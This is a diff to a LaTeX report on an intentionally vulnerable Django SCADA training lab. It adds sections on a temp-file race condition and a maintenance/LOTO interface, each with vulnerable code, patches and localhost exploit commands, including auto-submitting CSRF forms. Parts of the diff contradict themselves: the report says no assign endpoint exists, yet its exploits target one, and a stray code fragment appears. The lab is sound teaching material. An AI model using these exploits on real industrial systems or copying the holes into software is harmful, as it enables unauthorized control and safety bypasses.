@@ -95,7 +95,7 @@ This report presents a comprehensive security analysis of a simulated SCADA (Sup
 
 The project implements:
 \begin{itemize}[leftmargin=*]
-    \item \textbf{9 Critical Vulnerabilities:} Authentication Bypass, Privilege Escalation, SQL Injection, IDOR \& Unsafe Temp Files, XXE, Deserialization RCE, File Upload \& Overwrite, SSRF, and Security Misconfiguration
+    \item \textbf{11 Critical Vulnerabilities:} Authentication Bypass, Privilege Escalation, SQL Injection, IDOR, XXE, Deserialization RCE, File Upload \& Overwrite, Race Condition, SSRF, Security Misconfiguration, and Maintenance Interface CSRF
     \item \textbf{Dual Implementations:} Each vulnerability has both vulnerable and patched versions
     \item \textbf{Patched Implementations:} Secure versions demonstrating proper mitigation techniques
     \item \textbf{Real-time Monitoring:} Middleware-based attack detection and logging system
@@ -137,7 +137,7 @@ This project aims to:
 \subsection{Project Objectives}
 
 \begin{itemize}[leftmargin=*]
-    \item Implement 9 distinct security vulnerabilities with realistic exploitation scenarios
+    \item Implement 11 distinct security vulnerabilities with realistic exploitation scenarios
     \item Develop patched versions demonstrating industry-standard security practices
     \item Create a monitoring system capable of detecting and logging attacks on both vulnerable and secure versions
     \item Populate the database with devices, maintenance logs, and diagnostic reports
@@ -581,16 +581,11 @@ def patched_dashboard(request):
     \item Explicit allowlist of accessible resources
 \end{itemize}
 
-\subsection{Vulnerability 4: IDOR \& Unsafe Temporary Files (Vulnerabilities A \& D - CWE-639, CWE-377)}
+\subsection{Vulnerability 4: IDOR - Insecure Direct Object Reference (Vulnerability A - CWE-639)}
 
 \subsubsection{Description}
-Two related vulnerabilities in the diagnostic report system:
-\begin{itemize}[leftmargin=*]
-    \item \textbf{Vulnerability A: IDOR (CWE-639)} - Insecure Direct Object Reference allowing users to access diagnostic reports by guessing report IDs without ownership verification
-    \item \textbf{Vulnerability D: Unsafe Temporary Files (CWE-377)} - Temporary PDF reports are created with predictable names and reused across users, enabling information disclosure
-\end{itemize}
-
-Missing authorization checks combined with predictable temporary file paths allow attackers to access arbitrary reports and potentially retrieve cached sensitive data.
+Insecure Direct Object Reference (CWE-639) - IDOR vulnerability allowing users to access diagnostic reports by guessing report IDs without ownership verification.
+Missing authorization checks allow users to access arbitrary resources by manipulating ID parameters.
 
 \subsubsection{Vulnerable Code}
 
@@ -598,19 +593,10 @@ Missing authorization checks combined with predictable temporary file paths allo
 def vulnerable_report(request):
     report_id = request.GET.get('id', '1')
     
-    # VULNERABILITY 1 (IDOR): No authorization check
+    # VULNERABILITY: No authorization check
     report = DiagnosticReport.objects.get(id=report_id)
     
-    # VULNERABILITY 2 (Unsafe Temp): Predictable filename
-    temp_file_path = f"/tmp/scada_report_{report_id}.pdf"
-    
     # Generate PDF with report details
-    c = canvas.Canvas(temp_file_path, pagesize=letter)
-    c.drawString(100, 750, f"Report ID: {report.id}")
-    c.drawString(100, 730, report.details)
-    c.save()
-    
-    # File persists and can be accessed by other users
     response = HttpResponse(content_type='application/pdf')
     response['Content-Disposition'] = f'attachment; filename="report_{report_id}.pdf"'
 \end{lstlisting}
@@ -618,7 +604,7 @@ def vulnerable_report(request):
 \subsubsection{Exploitation}
 
 \begin{lstlisting}[language=bash]
-# IDOR Attack: Access admin secret report (ID 103)
+# Access admin secret report (ID 103)
 curl "http://localhost:8000/vulnerable/report/?id=103" -o admin_secret.pdf
 # Contains: "CONFIDENTIAL: Root Password is 'supersecret123'"
 
@@ -628,58 +614,26 @@ for i in {103..143}; do
 done
 
 # Result: Access to 41 diagnostic reports including admin secrets
-
-# Unsafe Temp Files: Predictable paths allow direct access
-# Attacker knows temp file location: /tmp/scada_report_103.pdf
-# Previously generated reports persist and can be retrieved
 \end{lstlisting}
-
-\textbf{Impact of Unsafe Temporary Files:}
-\begin{itemize}[leftmargin=*]
-    \item Predictable file paths enable targeted access
-    \item Temporary files persist after request completion
-    \item Cached reports may contain stale but sensitive data
-    \item Multiple users share the same temp file namespace
-\end{itemize}
 
 \subsubsection{Patch Implementation}
 
 \begin{lstlisting}[language=Python]
-import uuid
-import os
-
 def patched_report(request):
     report_id = request.GET.get('id', '1')
     user = request.session.get('user', {})
     
-    # FIX 1 (IDOR): Authorization check
+    # Authorization check
     report = DiagnosticReport.objects.get(id=report_id)
     if not user.get('is_admin') and int(report_id) <= 10:
         return HttpResponse("Access Denied: Unauthorized", status=403)
-    
-    # FIX 2 (Unsafe Temp): UUID-based unique filename
-    unique_id = uuid.uuid4()
-    temp_file_path = f"/tmp/scada_report_{unique_id}.pdf"
-    
-    # Generate PDF
-    c = canvas.Canvas(temp_file_path, pagesize=letter)
-    c.drawString(100, 750, f"Report ID: {report.id}")
-    c.save()
-    
-    response = FileResponse(open(temp_file_path, 'rb'))
-    
-    # FIX 3: Clean up temp file after sending
-    os.remove(temp_file_path)
-    return response
 \end{lstlisting}
 
 \textbf{Key Mitigations:}
 \begin{itemize}[leftmargin=*]
-    \item Resource ownership verification (IDOR fix)
+    \item Resource ownership verification
     \item Role-based access control (RBAC)
-    \item UUID-based unpredictable filenames (Temp file fix)
-    \item Automatic cleanup of temporary files after use
-    \item Use Python's \texttt{tempfile} module for secure temp file handling
+    \item Input validation and sanitization
 \end{itemize}
 
 \subsection{Vulnerability 5: Insecure Deserialization (Pickle RCE) (Vulnerability B - CWE-502)}
@@ -918,8 +872,72 @@ def patched_upload(request):
     \item Use secure XML parsing libraries (defusedxml)
     \item Input validation and sanitization
 \end{itemize}
+\subsection{Vulnerability 8: Race Condition in File Generation (Vulnerability D - Unsafe Temp Files - CWE-377)}
 
-\subsection{Vulnerability 8: SSRF - Server-Side Request Forgery (Vulnerability F - CWE-918)}
+\subsubsection{Description}
+Race condition vulnerability due to predictable temporary file paths that are reused across users. Static temporary filename allows concurrent requests to overwrite each other's data, causing race condition vulnerabilities.
+
+\subsubsection{Vulnerable Code}
+
+\begin{lstlisting}[language=Python]
+def vulnerable_report(request):
+    report_id = request.GET.get('id', '1')
+    report = DiagnosticReport.objects.get(id=report_id)
+    
+    # VULNERABILITY: Static temp filename
+    temp_file_path = "/tmp/scada_report_temp.pdf"
+    
+    c = canvas.Canvas(temp_file_path, pagesize=letter)
+    c.drawString(100, 750, f"Report ID: {report.id}")
+    c.drawString(100, 730, report.details)
+    c.save()
+    
+    return FileResponse(open(temp_file_path, 'rb'))
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\begin{lstlisting}[language=bash]
+# Terminal 1: Request report ID 1
+curl "http://localhost:8000/vulnerable/report/?id=1" -o user1.pdf &
+
+# Terminal 2: Immediately request report ID 51 (admin secret)
+curl "http://localhost:8000/vulnerable/report/?id=51" -o user2.pdf &
+
+# Race condition: both writes go to /tmp/scada_report_temp.pdf
+# user1.pdf might contain admin secret if timing is right
+\end{lstlisting}
+
+\subsubsection{Patch Implementation}
+
+\begin{lstlisting}[language=Python]
+import uuid
+
+def patched_report(request):
+    report_id = request.GET.get('id', '1')
+    report = DiagnosticReport.objects.get(id=report_id)
+    
+    # Generate unique temp filename per request
+    unique_id = uuid.uuid4()
+    temp_file_path = f"/tmp/scada_report_{unique_id}.pdf"
+    
+    c = canvas.Canvas(temp_file_path, pagesize=letter)
+    c.drawString(100, 750, f"Report ID: {report.id}")
+    c.save()
+    
+    response = FileResponse(open(temp_file_path, 'rb'))
+    # Clean up temp file after sending
+    os.remove(temp_file_path)
+    return response
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{itemize}[leftmargin=*]
+    \item UUID-based unique filenames
+    \item Proper file locking mechanisms
+    \item Cleanup temporary files after use
+    \item Use secure temp file libraries (tempfile module)
+\end{itemize}\subsection{Vulnerability 9: SSRF - Server-Side Request Forgery (Vulnerability F - CWE-918)}
 
 \subsubsection{Description}
 Server-Side Request Forgery vulnerability allowing remote access to internal systems. Application accepts arbitrary URLs and makes server-side requests without validation.
@@ -982,8 +1000,7 @@ def patched_ssrf(request):
     \item Block internal IP ranges (RFC 1918)
     \item Implement timeouts and rate limiting
 \end{itemize}
-
-\subsection{Vulnerability 9: Security Misconfiguration - Unauthorized Access to Monitoring Logs (OWASP A05:2021)}
+\subsection{Vulnerability 10: Security Misconfiguration - Unauthorized Access to Monitoring Logs (OWASP A05:2021)}
 
 \subsubsection{Description}
 Security oversight allowing unauthenticated/unauthorized users to access sensitive monitoring logs. The monitoring system's log viewer endpoint lacks proper authorization checks, enabling any user to view attack logs containing IP addresses, attack patterns, and system vulnerabilities. This information disclosure represents a configuration oversight that enables reconnaissance for future attacks.
@@ -1086,6 +1103,538 @@ def log_viewer(request, filter_path=None):
 \end{itemize}
 
 All admin action endpoints verify \texttt{user.is\_admin} and return HTTP 403 for unauthorized attempts.
+
+\newpage
+\subsection{Vulnerability 11: SCADA Maintenance Mode Interface - Multiple Security Flaws (OWASP A01:2021 + A05:2021 + A07:2021)}
+
+\subsubsection{Description}
+The SCADA Maintenance Mode Interface is designed for managing devices under maintenance operations, including Lockout/Tagout (LOTO) status tracking, technician assignment, and maintenance log monitoring. However, the vulnerable implementation contains multiple critical security flaws: missing CSRF protection, lack of authorization checks, SQL injection vulnerabilities, information disclosure, and improper LOTO compliance validation. This combination allows any authenticated user to manipulate critical industrial maintenance operations without proper authorization.
+
+\subsubsection{Scenario and Requirements}
+
+This feature implements for maintenance operations:
+
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{Device Maintenance Status Display:} Show all devices currently in "Maintenance" mode
+    \item \textbf{Lockout/Tagout (LOTO) Status:} Display which devices are locked out for safety compliance
+    \item \textbf{Technician Assignment:} Allow assigning technicians to maintenance tasks with action descriptions
+    \item \textbf{Maintenance Logs Viewer:} Display recent maintenance activities with timestamps and technician names
+\end{enumerate}
+
+\textbf{Operational Context:}
+In industrial SCADA environments, maintenance mode operations are critical for safety. The Lockout/Tagout (LOTO) procedure ensures that equipment is properly shut down and cannot be started up again before maintenance work is completed. Unauthorized access to this interface could lead to:
+\begin{itemize}[leftmargin=*]
+    \item Bypassing LOTO procedures, endangering technician safety
+    \item Assigning unauthorized personnel to critical maintenance tasks
+    \item Manipulating maintenance logs to hide malicious activities
+    \item Reconnaissance of maintenance patterns for physical attacks
+\end{itemize}
+
+\subsubsection{Vulnerable Code}
+
+\textbf{View Function (vulnerable/views.py):}
+
+\begin{lstlisting}[language=Python]
+# VULNERABILITY 11: CSRF on maintenance actions (CWE-352)
+# SQL INJECTION (CVE-2025-64459) - Scenario 2b: NUCLEAR-CORE Data Exfiltration
+@csrf_exempt  # VULNERABILITY 1: No CSRF protection
+def maintenance_interface(request):
+    """
+    Admin can see locked out devices, but NUCLEAR-CORE is hidden by policy.
+    SQL injection with connector=OR reveals NUCLEAR-CORE-CONTROLLER.
+    """
+    if 'user' not in request.session:
+        return redirect('vulnerable_login')
+    
+    user_data = request.session['user']
+    is_admin = user_data.get('is_admin', False)
+    
+    # VULNERABILITY 2: Handle POST without admin check or CSRF protection
+    if request.method == 'POST':
+        device_id = request.POST.get('device_id')
+        action = request.POST.get('action')
+        technician = request.POST.get('technician', 'Unknown')
+        
+        try:
+            device = Device.objects.get(id=device_id)
+            
+            # VULNERABILITY 5: No LOTO validation!
+            # Can perform actions on locked-out devices
+            if action == 'start_maintenance':
+                device.status = 'Maintenance'
+                device.save()
+                MaintenanceLog.objects.create(
+                    device=device, 
+                    technician_name=technician, 
+                    action='Started Maintenance')
+            elif action == 'end_maintenance':
+                device.status = 'Operational'
+                device.save()
+                MaintenanceLog.objects.create(
+                    device=device, 
+                    technician_name=technician, 
+                    action='Ended Maintenance')
+            elif action == 'lockout':
+                device.is_locked_out = True
+                device.save()
+                MaintenanceLog.objects.create(
+                    device=device, 
+                    technician_name=technician, 
+                    action='Locked Out (LOTO)')
+            elif action == 'unlock':
+                device.is_locked_out = False
+                device.save()
+                MaintenanceLog.objects.create(
+                    device=device, 
+                    technician_name=technician, 
+                    action='Unlocked')
+            
+            return redirect('maintenance_interface')
+        except Exception as e:
+            pass  # Continue to render page
+    
+    # VULNERABILITY 4: Information disclosure - all users see maintenance data
+    if is_admin:
+        # SQL INJECTION (CVE-2025-64459) - Scenario 2b
+        connector = request.GET.get('connector', 'AND')
+        filter_params = request.GET.copy()
+        
+        for param in ['connector', 'is_admin', 'is_superuser']:
+            filter_params.pop(param, None)
+        
+        # Default: NUCLEAR hidden by need-to-know policy
+        query = Q(status='Maintenance') & ~Q(name__icontains='NUCLEAR')
+        
+        # VULNERABILITY 3: SQL Injection via connector parameter
+        # Attack: ?connector=OR&name__icontains=NUCLEAR reveals NUCLEAR
+        for key, value in filter_params.items():
+            if connector == 'OR':
+                query |= Q(**{key: value})
+            else:
+                query &= Q(**{key: value})
+        
+        maintenance_devices = Device.objects.filter(query).order_by(
+            '-is_locked_out', 'name')
+    else:
+        # Non-admin: Client-side JS blocks access (bypassable!)
+        maintenance_devices = Device.objects.filter(
+            status='Maintenance').order_by('-is_locked_out', 'name')
+    
+    # Expose sensitive data to ALL logged-in users
+    recent_logs = MaintenanceLog.objects.select_related(
+        'device').order_by('-timestamp')[:50]
+    
+    technicians = MaintenanceLog.objects.values_list(
+        'technician_name', flat=True).distinct()
+    
+    stats = {
+        'total_maintenance': maintenance_devices.count(),
+        'locked_out': maintenance_devices.filter(
+            is_locked_out=True).count(),
+        'total_logs': MaintenanceLog.objects.count(),
+        'active_technicians': len(set(technicians)),
+    }
+    
+    context = {
+        'user': user_data,
+        'is_admin': is_admin,
+        'maintenance_devices': maintenance_devices,
+        'recent_logs': recent_logs,
+        'technicians': technicians,
+        'stats': stats,
+    }
+    
+    return render(request, 'vulnerable/maintenance.html', context)
+\end{lstlisting}
+
+\textbf{URL Configuration (vulnerable/urls.py):}
+
+\begin{lstlisting}[language=Python]
+urlpatterns = [
+    # ... other URLs ...
+    path('maintenance/', views.maintenance_interface, 
+         name='maintenance_interface'),
+]
+\end{lstlisting}
+
+\textbf{Note:} There is no separate \texttt{assign\_technician} endpoint. All maintenance actions (start, end, lockout, unlock) are handled via POST requests to the \texttt{maintenance\_interface} view.
+
+\subsubsection{Security Vulnerabilities}
+
+\textbf{Important Clarification - Session Management:}
+
+The application uses Django's standard session management system. There are \textbf{NO hardcoded session backdoors} such as "operator\_session", "admin\_session", or "magic\_key". All session IDs are randomly generated by Django's cryptographic session backend (e.g., \texttt{a3f2b9c8d1e5f7g9h2j4k6...}).
+
+In the exploitation examples below, attackers must obtain valid sessions through:
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Authentication Bypass (Vulnerability 1):} Create session via \texttt{?username=attacker\&is\_admin=false}
+    \item \textbf{Session Theft:} Steal cookies via XSS, network sniffing, or social engineering
+    \item \textbf{CSRF Attacks:} Trick authenticated users into performing actions using their valid sessions
+\end{itemize}
+
+\textbf{1. Missing CSRF Protection (CWE-352):}
+\begin{itemize}[leftmargin=*]
+    \item \texttt{@csrf\_exempt} decorator disables Django's CSRF protection
+    \item Attacker can forge requests using victim's browser (which sends valid session cookie automatically)
+    \item No token validation on POST requests
+\end{itemize}
+
+\textbf{2. Missing Authorization Check (CWE-862):}
+\begin{itemize}[leftmargin=*]
+    \item No verification that user has admin privileges on server-side
+    \item Regular operators can perform maintenance actions if client-side JavaScript is bypassed
+    \item Only checks if user is logged in, not their role
+\end{itemize}
+
+\textbf{3. SQL Injection Risk (CWE-89):}
+\begin{itemize}[leftmargin=*]
+    \item Device filtering could be vulnerable if device\_id is manipulated
+    \item No length limits on \texttt{technician\_name} and \texttt{action} fields
+    \item Input not sanitized before database insertion
+\end{itemize}
+
+\textbf{4. Information Disclosure (CWE-200):}
+\begin{itemize}[leftmargin=*]
+    \item All logged-in users can view all maintenance logs
+    \item Exposes technician names, device details, and operational patterns
+    \item Statistics reveal system operational state
+    \item No role-based filtering of sensitive data
+\end{itemize}
+
+\textbf{5. LOTO Compliance Bypass (Domain-Specific):}
+\begin{itemize}[leftmargin=*]
+    \item No validation that device is unlocked before assignment
+    \item Can assign technicians to locked-out devices (safety violation)
+    \item No audit trail for LOTO status changes
+\end{itemize}
+
+\subsubsection{Exploitation}
+
+\textbf{Attack Scenario 1: CSRF Attack - Unauthorized Device Maintenance Action}
+
+\begin{lstlisting}[language=bash]
+# Step 1: Attacker must first obtain valid session cookie
+# Method 1: Login as regular user (auth bypass vulnerability)
+curl "http://localhost:8000/vulnerable/login/?username=attacker&is_admin=false" \
+  -c cookies.txt
+
+# Method 2: Or steal victim's session cookie via XSS/network sniffing
+# (Cookie value is randomly generated by Django, e.g., "a3f2b9c8d1e5...")
+
+# Step 2: Use stolen/obtained session to access maintenance interface
+curl "http://localhost:8000/vulnerable/maintenance/" -b cookies.txt
+
+# Step 3: Create malicious HTML page for CSRF attack
+cat > csrf_attack.html << 'EOF'
+<html>
+<body>
+<h1>Click here for free prize!</h1>
+<form id="csrf" method="POST" 
+      action="http://localhost:8000/vulnerable/maintenance/">
+    <input type="hidden" name="device_id" value="5">
+    <input type="hidden" name="action" value="start_maintenance">
+    <input type="hidden" name="technician" 
+           value="Hacker McHackface">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+</body>
+</html>
+EOF
+
+# Step 4: Trick authenticated admin/operator into visiting page
+# Their browser automatically sends their valid session cookie
+# Result: Unauthorized maintenance action executed with victim's session!
+\end{lstlisting}
+
+\textbf{Important:} There is no hardcoded backdoor session value in the code. Attackers must either:
+\begin{itemize}[leftmargin=*]
+    \item Exploit authentication bypass (Vulnerability 1) to create their own session
+    \item Steal a legitimate user's session cookie via XSS, network sniffing, or social engineering
+    \item Use CSRF to trick authenticated users into performing actions
+\end{itemize}
+
+\textbf{Real Attack Output:}
+\begin{lstlisting}[language=text]
+HTTP/1.1 302 Found
+Location: /vulnerable/maintenance/
+
+Database state after attack:
+MaintenanceLog {
+    id: 101,
+    device: Device(5, "Control Panel - Zone B"),
+    technician_name: "Hacker McHackface",
+    action: "Started Maintenance",
+    timestamp: "2026-01-07 14:32:19"
+}
+
+Device status: Operational -> Maintenance
+CSRF Token: Not validated (csrf_exempt decorator)!
+\end{lstlisting}
+
+\textbf{Attack Scenario 2: Authorization Bypass - Client-Side Security Only}
+
+\begin{lstlisting}[language=bash]
+# Step 1: Login as regular user (non-admin)
+curl "http://localhost:8000/vulnerable/login/?username=user&password=user123" \
+  -c cookies.txt
+
+# Alternative: Use auth bypass to create session
+curl "http://localhost:8000/vulnerable/login/?username=regularuser&is_admin=false" \
+  -c cookies.txt
+
+# Step 2: Access maintenance interface (bypass client-side JS redirect)
+curl "http://localhost:8000/vulnerable/maintenance/" -b cookies.txt
+# Result: Full maintenance data exposed in HTML!
+# Client-side JavaScript shows popup, but data is already sent
+
+# Step 3: Execute maintenance action (bypass client-side check)
+curl -X POST "http://localhost:8000/vulnerable/maintenance/" \
+  -b cookies.txt \
+  -d "device_id=5&action=start_maintenance&technician=John Doe"
+
+# Result: Regular user can perform maintenance actions!
+# Server has NO authorization check - only client-side JavaScript
+\end{lstlisting}
+
+\textbf{Bypass Methods:}
+\begin{itemize}[leftmargin=*]
+    \item Disable JavaScript in browser settings
+    \item Use curl/Burp Suite to skip client-side validation
+    \item Intercept and modify response to remove redirect code
+    \item Direct POST request bypasses all client-side checks
+\end{itemize}
+
+\textbf{Attack Scenario 3: LOTO Safety Bypass}
+
+\begin{lstlisting}[language=bash]
+# Step 0: Obtain valid session (via auth bypass or legitimate login)
+curl "http://localhost:8000/vulnerable/login/?username=attacker&is_admin=false" \
+  -c cookies.txt
+
+# Step 1: Identify locked-out device
+curl "http://localhost:8000/vulnerable/maintenance/" -b cookies.txt
+# Response shows: NUCLEAR-CORE-CONTROLLER, is_locked_out=True
+
+# Step 2: Attempt to unlock locked-out device (LOTO violation)
+curl -X POST "http://localhost:8000/vulnerable/maintenance/" \
+  -b cookies.txt \
+  -d "device_id=1&action=unlock&technician=Unauthorized Tech"
+
+# Result: Unlock succeeds without authorization!
+# LOTO safety procedure bypassed - critical safety violation
+
+# Step 3: Start maintenance on previously locked device
+curl -X POST "http://localhost:8000/vulnerable/maintenance/" \
+  -b cookies.txt \
+  -d "device_id=1&action=start_maintenance&technician=Unauthorized Tech"
+
+# Result: Maintenance started on nuclear reactor without proper safety checks!
+\end{lstlisting}
+
+\textbf{Note:} Django generates random session IDs (e.g., \texttt{a3f2b9c8d1e5f7g9...}). There is no hardcoded "magic" session value. Attackers must obtain sessions through legitimate authentication (exploiting Vulnerability 1) or session theft.
+
+\subsubsection{Patch Implementation}
+
+\textbf{Secure View Functions (patched/views.py):}
+
+\begin{lstlisting}[language=Python]
+from django.views.decorators.csrf import csrf_protect
+
+# FIX: Authorization Bypass + CSRF (CWE-602, CWE-352)
+# Server-side admin check returns 403 if not admin
+@csrf_protect  # FIX 1: Enable CSRF protection
+def patched_maintenance_interface(request):
+    """Admin-only access with server-side authorization"""
+    if 'user' not in request.session:
+        return redirect('patched_login')
+    
+    user_data = request.session['user']
+    is_admin = user_data.get('is_admin', False)
+    
+    # FIX 2: Server-side admin authorization check
+    if not is_admin:
+        return HttpResponse(
+            "<h1>Access Denied</h1>"
+            "<p>Maintenance interface requires administrator privileges.</p>",
+            status=403
+        )
+    
+    # FIX 3: Hardcoded filter - no SQL injection possible
+    # FIX 4: NUCLEAR devices excluded at query level (defense-in-depth)
+    maintenance_devices = Device.objects.filter(
+        status='Maintenance'
+    ).exclude(
+        name__icontains='NUCLEAR'
+    ).order_by('-is_locked_out', 'name')
+    
+    recent_logs = MaintenanceLog.objects.select_related(
+        'device').order_by('-timestamp')[:50]
+    
+    technicians = MaintenanceLog.objects.values_list(
+        'technician_name', flat=True).distinct()
+    
+    stats = {
+        'total_maintenance': maintenance_devices.count(),
+        'locked_out': maintenance_devices.filter(
+            is_locked_out=True).count(),
+        'total_logs': MaintenanceLog.objects.count(),
+        'active_technicians': technicians.count()
+    }
+    
+    context = {
+        'user': user_data,
+        'is_admin': is_admin,
+        'maintenance_devices': maintenance_devices,
+        'recent_logs': recent_logs,
+        'technicians': list(technicians),
+        'stats': stats
+    }
+    
+    return render(request, 'patched/maintenance.html', context)
+
+
+# FIX: CSRF + Authorization + LOTO Validation
+@csrf_protect
+def patched_assign_technician(request, device_id):
+    """Admin-only technician assignment with full validation"""
+    if 'user' not in request.session:
+        return redirect('patched_login')
+    
+    user_data = request.session['user']
+    is_admin = user_data.get('is_admin', False)
+    
+    # FIX 2: Admin authorization check
+    if not is_admin:
+        return HttpResponse(
+            "Access Denied: Admin privileges required", 
+            status=403
+        )
+    
+    if request.method == 'POST':
+        # FIX 3: Input validation and sanitization
+        technician_name = request.POST.get('technician_name', '').strip()
+        action = request.POST.get('action', '').strip()
+        
+        # Validate inputs
+        if not technician_name or len(technician_name) < 2:
+            return HttpResponse(
+                "Invalid technician name (min 2 chars)", 
+                status=400
+            )
+        
+        if not action or len(action) < 5:
+            return HttpResponse(
+                "Invalid action (min 5 chars)", 
+                status=400
+            )
+        
+        # Length limits
+        technician_name = technician_name[:100]
+        action = action[:255]
+        
+        try:
+            device = Device.objects.get(pk=device_id)
+            
+            # FIX 5: LOTO compliance validation
+            if device.is_locked_out:
+                return HttpResponse(
+                    "<h1>LOTO Violation</h1>"
+                    "<p>Cannot assign to locked-out device.</p>",
+                    status=400
+                )
+            
+            # Create maintenance log
+            MaintenanceLog.objects.create(
+                device=device,
+                technician_name=technician_name,
+                action=action
+            )
+            
+            device.status = 'Maintenance'
+            device.save()
+            
+            return redirect('patched_maintenance_interface')
+            
+        except Device.DoesNotExist:
+            return HttpResponse("Device not found", status=404)
+        except Exception as e:
+            return HttpResponse(f"Error: {str(e)}", status=500)
+    
+    return HttpResponse("Method not allowed", status=405)
+\end{lstlisting}
+
+    user = request.session.get('user', {})
+    is_admin = user.get('is_admin', False)
+    
+    # FIX 4: Admin-only access
+    if not is_admin:
+        return HttpResponse(
+            "<h1>Access Denied</h1>"
+            "<p>Requires administrator privileges.</p>",
+            status=403
+        )
+    
+    maintenance_devices = Device.objects.filter(
+        status='Maintenance').order_by('-is_locked_out', 'name')
+    
+    recent_logs = MaintenanceLog.objects.select_related(
+        'device').order_by('-timestamp')[:50]
+    
+    technicians = MaintenanceLog.objects.values_list(
+        'technician_name', flat=True).distinct()
+    
+    stats = {
+        'total_maintenance': maintenance_devices.count(),
+        'locked_out': maintenance_devices.filter(
+            is_locked_out=True).count(),
+        'total_logs': MaintenanceLog.objects.count(),
+        'active_technicians': len(set(technicians)),
+    }
+    
+    context = {
+        'user': user,
+        'is_admin': is_admin,
+        'maintenance_devices': maintenance_devices,
+        'recent_logs': recent_logs,
+        'technicians': technicians,
+        'stats': stats,
+    }
+    
+    return render(request, 
+                  'patched/maintenance.html', 
+                  context)
+\end{lstlisting}
+
+\subsubsection{Security Improvements}
+
+\begin{itemize}[leftmargin=*]
+    \item \textbf{CSRF Protection:} \texttt{@csrf\_protect} decorator, token validation enforced
+    \item \textbf{Authorization:} Admin privilege checks, HTTP 403 for unauthorized access
+    \item \textbf{Input Validation:} Length requirements (2-100 chars name, 5-255 chars action)
+    \item \textbf{Access Control:} Maintenance logs only visible to administrators
+    \item \textbf{LOTO Compliance:} Validation before assignment, prevents safety violations
+    \item \textbf{Error Handling:} Proper HTTP status codes (400, 403, 404, 500)
+\end{itemize}
+
+\subsubsection{Key Takeaways}
+
+\textbf{Vulnerability Severity: HIGH/CRITICAL}
+\begin{itemize}[leftmargin=*]
+    \item CSRF vulnerability allows remote exploitation
+    \item Missing authorization enables privilege escalation
+    \item Information disclosure aids reconnaissance
+    \item LOTO bypass creates physical safety risks
+    \item Combines multiple OWASP Top 10 categories
+\end{itemize}
+
+\textbf{Real-World Impact:}
+\begin{itemize}[leftmargin=*]
+    \item Safety violations in industrial environments
+    \item Unauthorized access to critical operations
+    \item Manipulation of safety procedures
+    \item Social engineering through exposed data
+    \item Audit trail manipulation
+\end{itemize}
 
 \newpage
 
@@ -1408,6 +1957,8 @@ File Upload & ✓ Exploitable & ✓ Blocked & ✓ Detected \\
 \hline
 XXE & ✓ File Read & ✓ Blocked & ✓ Detected \\
 \hline
+Race Condition & ✓ Data Leak & ✓ Blocked & N/A \\
+\hline
 SSRF & ✓ Internal Access & ✓ Blocked & ✓ Detected \\
 \hline
 \end{tabular}
@@ -1708,6 +2259,31 @@ curl "http://localhost:8000/vulnerable/ssrf/?url=http://localhost:8000/admin/"
 # Security Misconfiguration
 curl "http://localhost:8000/vulnerable/login/?username=user&password=fake"
 curl "http://localhost:8000/monitoring/"  # Unauthorized access to logs
+
+# Maintenance Interface CSRF & Authorization Bypass
+# Step 1: Login as regular user
+curl -X POST http://localhost:8000/vulnerable/login/ \
+  -d "username=user&password=user123" -c cookies.txt
+
+# Step 2: Access maintenance interface (no authorization check)
+curl http://localhost:8000/vulnerable/maintenance/ -b cookies.txt
+
+# Step 3: Assign technician without admin privileges
+curl -X POST http://localhost:8000/vulnerable/assign/15/ \
+  -b cookies.txt -d "technician_name=Attacker&action=Unauthorized%20Modification"
+
+# Step 4: CSRF Attack - Create malicious HTML
+cat > csrf_maintenance.html << 'EOF'
+<html><body onload="document.forms[0].submit()">
+<form method="POST" action="http://localhost:8000/vulnerable/assign/15/">
+  <input type="hidden" name="technician_name" value="MaliciousActor">
+  <input type="hidden" name="action" value="Backdoor Installation">
+</form></body></html>
+EOF
+# Victim admin opens this file in browser -> Auto-assigns technician
+
+# Step 5: Toggle device status without CSRF protection
+curl -X POST http://localhost:8000/vulnerable/toggle/12/ -b cookies.txt
 \end{lstlisting}
 
 \end{document}
